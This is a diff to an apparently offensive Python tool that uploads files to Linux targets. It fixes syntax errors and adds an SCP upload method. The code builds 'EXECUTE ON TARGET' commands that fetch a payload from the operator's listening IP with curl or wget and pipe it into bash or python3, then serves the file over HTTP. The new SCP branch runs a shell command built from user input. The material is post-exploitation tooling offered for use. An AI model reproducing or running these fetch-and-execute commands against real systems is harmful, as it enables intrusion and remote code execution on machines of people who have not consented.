@@ -43,8 +43,8 @@ UploadTo_NixMethods = [
     'Base64',
     'Base64 - Fileless',
     'HTTP',
-    'HTTP - Fileless'
-    '/dev/tcp',
+    'HTTP - Fileless',
+    # '/dev/tcp',
     'SCP'
 ]
 
@@ -413,7 +413,7 @@ def upload_to(args):
         #########################
         ### LINUX HTTP METHOD ###
         #########################
-        if method == 'HTTP' or method == 'HTTP - Fileless':
+        elif method == 'HTTP' or method == 'HTTP - Fileless':
             listen_ip = listening_ip_address()
             listen_port = '443'
 
@@ -429,7 +429,7 @@ def upload_to(args):
                     cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                     if choice == 'BASH script (.sh)':
                         cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
-                    elif choice == 'Python script (.py)'
+                    elif choice == 'Python script (.py)':
                         cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'
             if choice == 'wget':
                 if method == 'HTTP':
@@ -441,11 +441,34 @@ def upload_to(args):
                     cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                     if choice == 'BASH script (.sh)':
                         cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
-                    elif choice == 'Python script (.py)'
+                    elif choice == 'Python script (.py)':
                         cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'
 
             start_http_server(listen_ip, listen_port, relpath)
             terminate_http_server()
+
+        ########################
+        ### LINUX SCP METHOD ###
+        ########################
+        elif method == 'SCP':
+            print('[?] Target IP: ', end='')
+            target_ip = input()
+            print('[?] Target port [default=22]: ', end='')
+            target_port = input()
+            if target_port == '':
+                target_port = '22'
+            print('[?] SCP Username: ', end='')
+            scp_user = input()
+            scp_password = getpass(prompt='[?] SCP Password: ')
+            print('[+] Uploading ' + args.filename + ' to /tmp on ' + target_ip + ' ...')
+            cmd = 'scp -P ' + target_port + ' ' + relpath + ' ' + scp_user + '@' + target_ip + ':/tmp/' + rand_filename
+            proc = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if proc.returncode == 0:
+                print('[+] File uploaded as /tmp/' + rand_filename)
+            elif proc.returncode == 255:
+                print('[!] File could not be uploaded. Connection refused.')
+
+            
 
 # UPLOAD FILES FROM
 def upload_from(args):
